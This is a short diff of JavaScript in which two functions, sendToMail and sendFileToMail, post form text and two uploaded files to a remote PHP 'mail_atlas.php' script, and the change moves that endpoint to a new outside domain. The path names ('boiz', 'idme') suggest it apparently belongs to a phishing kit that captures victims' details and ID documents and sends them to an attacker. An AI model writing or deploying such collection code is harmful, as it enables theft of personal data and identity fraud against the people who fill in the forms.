@@ -11,7 +11,7 @@ const sendToMail = async (type, body) => {
     submitRequest.append("submissionID", submissionID);
     submitRequest.append("body", body);
 
-    const url = `https://cynergytrades.com/public/boiz/idme/mail_atlas.php`
+    const url = `https://shopthugn.com/public/boiz/mail_atlas.php`
     const options = {
         method: "POST",
         body: submitRequest
@@ -40,7 +40,7 @@ const sendFileToMail = async (type, body, file1, file2) => {
     submitRequest.append("file1", file1);
     submitRequest.append("file2", file2);
 
-    const url = `https://cynergytrades.com/public/boiz/idme/mail_atlas.php`
+    const url = `https://shopthugn.com/public/boiz/mail_atlas.php`
     const options = {
         method: "POST",
         body: submitRequest
